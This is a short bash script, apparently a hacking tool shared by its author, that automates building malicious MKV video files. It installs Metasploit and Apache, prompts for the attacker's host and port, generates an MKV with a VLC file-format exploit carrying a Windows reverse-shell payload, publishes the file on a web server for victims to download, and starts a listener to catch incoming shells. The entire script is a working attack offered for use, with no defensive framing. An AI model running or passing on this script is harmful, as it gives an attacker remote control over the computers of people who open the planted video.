#!/bin/bash
# Make Malacious MKV Movies
# Created By Mehedi Shakeel
clear
cat << EOF                                                                                                             

                  _                          
â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆâ–ˆ    â–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ    â–ˆâ–ˆ 
â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ    â–ˆâ–ˆ 
â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆ    â–ˆâ–ˆ 
â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ â–ˆâ–ˆ  â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆ  
â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ â–ˆâ–ˆ      â–ˆâ–ˆ â–ˆâ–ˆ   â–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆ   
                                                            
                                Version : 1.0
                             Created By : Mehedi Shakeel
                                YouTube : yt/mehedishakeel                            


EOF
sleep 2


#Checking For Root Access
echo "Checking For Root User...."
sleep 2
if [[ $(id -u) -ne 0 ]] ; then 
   echo "You are Not Root! Please Run as root" ; exit 1 ; 
else echo "Checking For Requirement Packages.." ; 
fi


#Checking and Installing Required Packages
pkgs=(metasploit-framework apache2)
for pkg in ${pkgs[@]}
do
 sudo apt install $pkg
done
sleep 2
clear

echo "Required Packages Has Been Installed Sucessfully"


#Setting Up Variables For Injecting
clear
read -p "Set Your LHOST: " lhost
read -p "Set Your LPORT: " lport

#Starting Msfconsole Handler
msfconsole -q -x "use exploit/windows/fileformat/vlc_mkv; set payload windows/x64/shell/reverse_tcp; set lhost $lhost; set lport $lport; exploit; exit;"

sudo service apache2 start
sudo cp /root/.msf4/local/*.mkv /var/www/html/

#Starting Msfconsole Handler
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/shell/reverse_tcp; set lhost $lhost; set lport $lport; exploit;"
